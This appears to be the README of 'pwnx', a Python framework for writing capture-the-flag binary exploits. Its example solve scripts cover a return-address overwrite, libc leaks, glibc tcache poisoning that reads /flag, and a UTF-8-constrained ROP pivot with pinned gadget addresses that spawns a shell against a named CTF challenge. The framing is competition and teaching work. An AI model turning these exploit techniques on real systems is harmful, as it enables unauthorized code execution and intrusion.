# pwnx

Pwnx is a Python-embedded exploit specification compiler. You describe the
target, evidence, capabilities, missing facts, and desired effect. Pwnx selects
a technique, compiles an inspectable plan, executes it in a declared
environment, and records an experiment that can be explained or replayed.

## The authoring model

Pwnx 0.3 has six primary concepts:

- **Target recipe** — how a reproducible target instance is materialized.
- **Conversation** — typed protocol messages and ordered state transitions.
- **Evidence** — observations, crashes, artifacts, debugger snapshots, and
  runtime facts.
- **Capability** — what the exploit can do, with scope and invalidation rules.
- **Technique proof** — a candidate realization with prerequisites,
  reliability, cost, actions, and rejected alternatives.
- **Experiment** — a plan, run, trace, report, comparison, and replay boundary.

The common solve remains small:

~~~python
from pwnx import Challenge

x = Challenge("./chall")
x.control(x.input.line("payload: ").return_address(at=72))
x.want(x.call(x.exe.win))

x.run()
~~~

The input declaration creates a capability and an implementation adapter. The
goal states the effect. Chronology and payload mechanics belong to the planner.

## Staged runtime knowledge

~~~python
from pwnx import Challenge, pointer

x = Challenge("./chall", libc="./libc.so.6")
x.control(x.input.line("payload: ").return_address(at=72))
x.learn(
    x.libc.puts,
    using=x.exe.write(1, x.exe.got.puts, 8),
    receive=pointer(8),
    resume=x.exe.main,
)
x.want(x.shell())

plan = x.plan()
print(plan.show())
plan.run()
~~~

The final call depends on the libc base, the leak recipe provides it, and the
planner schedules the leak before the shell technique.

## Environments are immutable recipes

~~~python
from pwnx import Challenge, LocalProcessRecipe, tcp

x = Challenge("./chall")
x.control(x.input.line("payload: ").return_address(at=72))
x.want(x.call(x.exe.win))

local = LocalProcessRecipe("./chall")
remote = tcp("challenge.example", 31337)

x.on("local-faithful", local)
x.run(on=remote)
~~~

Local, QEMU user/system, SSH, ADB, native/Wine Windows, CDB, serial, and
TCP/TLS recipes materialize a target with architecture, artifacts, argv,
lifecycle policy, independent service/process/connection epochs, and explicit
host-support evidence. The trace records the resulting target identity.

## Advanced solves stay competition-sized

Recipes compress established mechanics; they do not invent challenge facts.
The author still declares the menu, vulnerability, allocator version, leak
relationships, usable poison nodes, storage layout, and final goal. Pwnx owns
slot allocation, safe-link encoding, captures, fact propagation, tcache
choreography, ROP construction, packing, stages, trace, and replay.

~~~python
from pwnx import Challenge, tcp

x = Challenge("./chall", libc="./libc.so.6")

notes = x.heap.menu(
    b"> ",
    commands={"alloc": 1, "edit": 2, "show": 3, "free": 4, "finish": 5},
    prompts={"slot": b"idx: ", "size": b"size: ", "data": b"data: "},
)

h = x.heap(notes, glibc="2.35", slots=range(32))
uaf = h.uaf(read=notes.show, write=notes.edit)

heap = h.leak.safe_link(
    uaf, slot=0, size=0x100, bias=0, tcache_empty=True
)
h.leak.unsorted(
    uaf, slot=2, guard=3, size=0x500, bias=0x219CE0,
    arena_linked=True,
)

mem = h.tcache_poison(
    uaf,
    size=0x100,
    heap=heap,
    nodes=(heap + 0x9E0, heap + 0xC00),
)

path = h.store(b"/flag\0", at=heap + 0x6B0)
scratch = h.reserve(0x100, at=heap + 0x7C0)
stack = mem.read(x.libc.environ)
control = mem.return_address(stack - 0x138, trigger=notes.finish)

x.want(x.read_file(path, size=0x100, scratch=scratch), via=control)
x.run(on=tcp("challenge.example", 31337))
~~~

The complete executable example is
[`examples/advanced_heap_orw.py`](examples/advanced_heap_orw.py). The normal
solve imports no action, contract, fact, payload, packing, or ROP backend type.

### Drop down locally, not globally

All three authoring depths lower to the same action/provider graph:

1. **Intent recipes** cover established mechanics such as safe-link and
   unsorted-bin leaks, tcache memory access, return-address control, and ORW.
2. **Heap flows** expose individual allocations, frees, edits, captures, and
   derivations when one recipe does not fit the challenge.
3. **Function boundaries** isolate genuinely proprietary logic without asking
   the solve author to implement a framework class.

~~~python
with h.flow("nonstandard heap disclosure") as flow:
    slot = flow.alloc(0x100, slot=10)
    flow.free(slot)
    leak = flow.show(slot).pointer()
    heap = flow.derive("heap.base", leak << 12)
~~~

An opaque escape hatch is deliberately explicit:

~~~python
@x.boundary(
    "proprietary leak",
    needs=[x.heap.base],
    gives=[x.libc.base],
    reads=["connection.stream", "process.heap"],
    writes=["process.facts"],
)
def proprietary(_io, facts):
    return {"libc.base": facts["heap.base"] + 0x1000}
~~~

Only that function is opaque. The surrounding solve keeps normal planning,
provenance, transactional bindings, trace, and replay.

For one declared output, a boundary may return a legacy scalar or a mapping
keyed by that fact. Multiple outputs require a mapping containing exactly every
declared fact key; missing and extra keys fail, and values still pass typed Fact
validation. Boundary identity includes code, constants, defaults, keyword defaults,
and stably encodable closure values; pass `semantic_id=` for captured state
that cannot be encoded. Replay rejects a changed boundary identity.

`plan.show()` prints compact semantic stages. Use `plan.expand(stage)` when a
challenge requires the generated prompts, fields, captures, and payload actions.
Pinned `slot=`/`slots=` and finite `nodes=` make allocator choices explicit;
automatic choices remain deterministic and appear in both views.

A singleton safe-link disclosure establishes the fd-field page, not an
automatically guessed heap base. Supply `page_to_base=` (or `bias=`), using
zero only when local analysis proves the page equals the base. Tcache encoding
comes from the declared allocator: pre-safe-linking models write the target
directly, while safe-linked models encode it with the declared node address.
Unsorted recipes reject tcache-eligible sizes, and poisoning requires an
explicit 8-byte `write_word`; the standard heap menu provides one.

Tcache eligibility belongs to `AllocatorModel`, not to individual recipes.
The shipped glibc models use request2size semantics and a normalized
`tcache_max` of `0x410`: request `0x408` normalizes to `0x410` and is eligible;
request `0x409` normalizes to `0x420` and is not. Tcache poisoning and
unsorted-bin disclosure consult this same decision. Use `model=` for a tuned
allocator model; `model=` and `glibc=` are mutually exclusive.

The leak relationships are evidence, not guesses. Pass `tcache_empty=True`
(or `state="singleton"`) for the safe-link recipe and `arena_linked=True` for
the unsorted recipe, or provide a textual `assumption=` describing nonstandard
grooming. The resulting statements appear in `plan.assumptions` and
`plan.show()`.

`h.store()` and `h.reserve()` return owned storage with heap, challenge,
address, and size metadata. `read_file()` rejects foreign storage/control,
requires a NUL-terminated stored path, and verifies scratch capacity. Raw
addresses remain available with explicit `path_size=` and `scratch_size=`.
Storage requires a positive size, a non-negative slot from the declared domain,
and a non-empty semantic role.

Slots and poison nodes are ordered resources: pass tuples, lists, or ranges,
not sets or mappings. A conflicting pinned request fails atomically without
partially reserving slots or consuming a node.

Safe-linked access needs one concrete fd-field address per use in `nodes=`.
Older allocators without safe-linking may use `uses=N`; those are finite access
tokens, not invented node addresses.

Authoring mutations are transactional. A failed leak/storage/access declaration
or an exception in `HeapFlow` restores slots, access cursors, generated
sequences, capabilities, assumptions, and menu operation numbering.

Provider, strategy, and custom Action APIs remain available for extension
authors. They are implementation interfaces, not ordinary competition syntax.

The acceptance fixture executes prompt synchronization, safe-link and
unsorted-bin captures, tcache arbitrary-read choreography, fact propagation,
and trace replay through a deterministic transport. It also compiles the final
ORW stack strategy. Executing that last chain against a native vulnerable
glibc-2.35 fixture remains integration hardening and is not claimed by the
current test evidence.

## Constrained control flow without manual ROP

Hard challenges often expose an unusual relationship rather than a standard
overflow. The author pins that relationship and the usable gadgets; pwnx owns
layout, packing, index arithmetic, operation order, and byte validation.

[`examples/message_store_sugar.py`](examples/message_store_sugar.py) models the
Dice message-store challenge with the optional natural surface:

~~~python
from pwnx import Challenge, utf8

x = Challenge("./challenge")

store = x.menu(
    b"> ",
    name="store",
    message=(1, b"Message?", bytes),
    color=(2, b"> ", int),
    show=3,
)

message = x.buffer(
    name="message", at=0x2F9E38, size=0x1000, encoding="utf8"
).written_by(store.message)

call = x.control(store.color.indexes(
    table=0x2F08E8,
    target=message[80],
    trigger=store.show,
    eax=message,
))
pivot = x.control(call.pivot(eax=message, gadget=0x242D79))

rop = x.rop(
    pop_rdi=0x243565,
    pop_rsi=0x243431,
    zero_rax=0x247431,
    move_rdx_rax=0x2B184E,
    pop_rcx=0x247566,
    move_rax_rcx=0x2B4E73,
    syscall=0x2A6602,
    constraint=utf8(),
)

x.want(x.execve("sh"), via=pivot, using=rop)
x.run()
~~~

[`examples/message_store_constrained.py`](examples/message_store_constrained.py)
keeps the explicit `protocol.menu`, `buffer(write=..., constraint=...)`,
`indirect_call`, `pivot(pointer_register=...)`, and `rop.palette(...)` form as
the advanced fallback. Tests prove both forms produce identical plan JSON,
lowered Actions, EffectContracts, channels, codecs, payload bytes, computed
index, execution, and replay behavior.

The sugar is syntax compression, not another IR or an operator-overload DSL:

- `x.menu()` turns `(command, prompt, type, ...)` tuples into the same typed
  Menu/Choice/Field objects. Operations remain ordinary callable objects.
- `buffer(..., encoding="utf8").written_by(op)` configures the same
  ControlledBuffer. `buffer[offset]` is only shorthand for its bounded qword
  slice—not arbitrary memory or expression syntax.
- `operation.indexes(...)` delegates to `indirect_call`; register keywords are
  the same declared pre-call state.
- `pivot(eax=message, gadget=...)` is the register-keyword form of
  `pivot(stack=message, pointer_register="eax", ...)`.
- Callable `x.rop(pop_rdi=..., zero_rax=..., move_rdx_rax=..., syscall=...)`
  builds the same target-bound semantic palette. Malformed keywords fail.

Binding a QuickOperation as a buffer writer requires exactly one bytes field.
Its inferred bytes codec is capped at the controlled-buffer capacity; an
explicit stricter maximum is preserved and never widened. `written_by()`
returns a distinct bound QuickOperation/Choice view; the original operation,
menu definition, and sibling operations remain unchanged. Multiple buffers may
bind the same operation in any order and receive independent limits. Bound
views share only the underlying Menu's monotonic operation-ID counter, so
natural and explicit calls consume one deterministic sequence.

`ControlledBuffer` tracks one region map for author-stored data, fixed ROP
qwords, the dispatch qword, and the generated execve path. Every region has a
role and exact range; partial or complete overlap fails with both roles and
ranges in the diagnostic. `indirect_call()` computes and validates the signed table index
from the declared table and target qword. `pivot()` proves that the named
register points at the controlled buffer. The semantic ROP palette describes
what each pinned gadget does (`pop`, `zero`, `move`, `syscall`) without asking
the solve to build a chain. Authors may use the explicit maps shown above or
the equivalent `pinned={"pop rdi": ..., "xor rax": ..., "syscall": ...}`
shorthand.

Palettes belong to their Challenge, executable artifact SHA-256, and target
architecture; they cannot be reused against another binary. Pinned grammar is
strict: `pop REG`, `zero REG`, `xor REG REG` with identical operands,
`mov|move DST SRC`, and `syscall[; ret]`. Extra operands fail. Explicit and
pinned declarations normalize aliases (`eax`→`rax`, `edx`→`rdx`, `r8d`→`r8`).
Validation then checks the canonical name against the target ArchitectureSpec.
Unknown registers fail consistently in indirect-call state, pivot pointers,
explicit palette maps, and `pinned=` entries.

The execve strategy searches for a path location whose pointer, fixed dispatch
slot, pivot, register setup, syscall number, and complete payload all satisfy
the UTF-8 constraint. It then emits the buffer write, computed color/index
operation, and trigger in order. Invalid gadget bytes, unaligned call targets,
wrong register state, missing register realizations, or an impossible string
placement fail during planning.

`plan.show()` reports semantic fields—the buffer address/size/constraint,
table/target/index, pre-call register state, pivot gadget, palette coverage, and
execve strategy—without dumping payload bytes. `plan.expand(stage)` exposes the
exact encoded buffer write, computed index, and trigger. The shipped example
has executed successfully against the real Dice challenge locally. The opt-in
`test_real_dice_message_store_solve_gets_shell` runs it in Docker when
`PWNX_RUN_CTF_E2E=1` and the artifact is present, then verifies a shell
sentinel; normal tests cover deterministic execution and effect-free replay.

Successful goal preparation reserves unique menu operation IDs for its buffer
write, computed index, and trigger. Failed preparation restores every affected
menu counter. Preparation is cached by controlled-buffer revision, so repeated
`plan()` calls are ID-for-ID stable while separate goals retain distinct IDs.

## Experiments

~~~python
experiment = x.plan().experiment(target=remote)
with experiment.execute() as run:
    print(run.explain(x.libc.base))

print(experiment.report().describe())
replay = experiment.replay()
replay.close()
~~~

Experiments retain target identity, semantic facts, payload layouts, assumptions,
technique selection, raw effects, and causal replay boundaries.

## Purpose-native advanced workflows

These workflows extend the same fact/capability/proof/action model used by a
ret2win solve. Authors request effects and supply evidence; allocator or libc
technique names appear only in the resulting proof.

- Offline libc identification returns an immutable HypothesisSet; candidates
  remain ambiguous until discriminating evidence exists and never mutate
  Challenge.libc.
- ArtifactTransfer represents SSH upload, download, stat, and hash as bounded
  service-scoped actions with artifact hashes and replayed results.
- ArchitectureSpec, capability predicates, and backend registries select
  implementations for AMD64, i386, AArch64, ARM, MIPS, MIPSEL, and RISC-V
  without ambient architecture state.
- Memory resolution is a scoped action; arbitrary-read callbacks are not
  repeated during replay.
- Heap exploitation has a competition frontend for menu UAF, safe-link and
  unsorted leaks, finite tcache memory access, stack control, and ORW. It lowers
  into the versioned allocator model, actions, capabilities, and proofs; those
  implementation types do not appear in the normal solve.
- FSOP uses versioned FILELayout objects and StreamCapability goals, verifies a
  process-memory-write capability, and labels every FILE/wide-data/wide-vtable
  write; unsupported validation assumptions fail during proof construction.
- SROP frames consume an explicit versioned TargetABI schema through the ROP
  backend namespace; undeclared ABI layouts fail rather than borrowing AMD64.
- SearchAction and RaceAction require explicit budgets, deadlines, reset or
  restart policies, lanes, barriers, and success predicates. Their explicit
  `scheduler="processes"` boundary kills timed-out callbacks before another
  attempt starts; hosts without fork isolation fail before effects begin.
  Replay reuses the recorded result instead of repeating attempts.
- Investigation runs bounded static, crash, or external adapters and returns
  hypotheses, rejections, artifacts, metrics, and evidence. It never silently
  upgrades a hypothesis into a fact.
- Protocol byte transformations compose in wire order through one symmetric
  codec: CRC/checksum, zlib/gzip/bz2/lzma, and hash/HMAC stages declare input,
  output, decompression, and ratio limits. Hashing is labelled as integrity;
  only HMAC claims authentication. HMAC metadata carries an opaque `key_ref`,
  never a key-derived fingerprint.
- `AcquireWebArtifact` identifies downloads by a mandatory SHA-256 rather than
  a URL. TLS/origin/redirect/size/deadline policy, atomic cache publication,
  credential references, and replay are part of the action.
- `SubmissionRequest` makes competition submission explicitly authorized and
  idempotent. `ShellUploadAction` gives shell-only sessions a bounded,
  injection-safe, remotely verified transfer path.
- `ShellcodeExperiment` validates raw code in an authorized, bounded subprocess
  attempt and returns exit/signal, stdout/stderr, memory-map, duration, and
  payload-hash evidence. Replay never executes the code again. The built-in
  Linux backend is a containment aid, not a hardened native-code trust boundary.
- Payloads, codecs, protocol exchanges, core evidence, format discovery, and
  debugger actions retain provenance and explicit failure boundaries.

For example, a transformed wire value remains ordinary declarative protocol
data:

~~~python
from pwnx import CompressionTransform, DigestTransform, bytes_

packet = bytes_().through(
    CompressionTransform("gzip", max_decoded_size=1 << 20),
    DigestTransform(
        "sha256",
        key=session_key,
        key_ref="credential:challenge-hmac",
    ),
)
~~~

The parser reverses the exact pipeline and rejects malformed, unauthenticated,
trailing, oversized, or excessive-ratio data before it reaches the solve.

## Compatibility and backend mechanisms

Pwnx 0.2 mechanisms remain available for existing solves, but they are not the
primary 0.3 authoring language:

~~~python
from pwnx.compat import pwntools
from pwnx.backends import diagnostics, memory, rop, toolchain, transports
~~~

The compatibility namespace contains explicit-width packing aliases, cyclic
helpers, and tube constructors. Backend namespaces expose ROP compilers,
toolchains, transports, diagnostics, and memory resolvers for technique authors.
See [the migration guide](docs/MIGRATION_0_2_TO_0_3.md).

## CLI

~~~bash
pwnx plan solve.py
pwnx run solve.py --trace runs/first.json
pwnx replay solve.py runs/first.json
pwnx explain runs/first.json metadata.plan
pwnx diff runs/first.json runs/second.json
~~~

Primitive inspection commands remain available during migration, while the
primary workflow is plan, run, explain, replay, and compare.

## Installation and verification

~~~bash
uv pip install -e .
pytest -q
ruff check src tests
uvx mypy src/pwnx
scripts/test-linux.sh
uv build
~~~

Pwnx has no required runtime dependencies. Native exploit compilers currently
cover Linux AMD64; architecture and environment adapters declare other targets
without pretending an unsupported compiler exists.
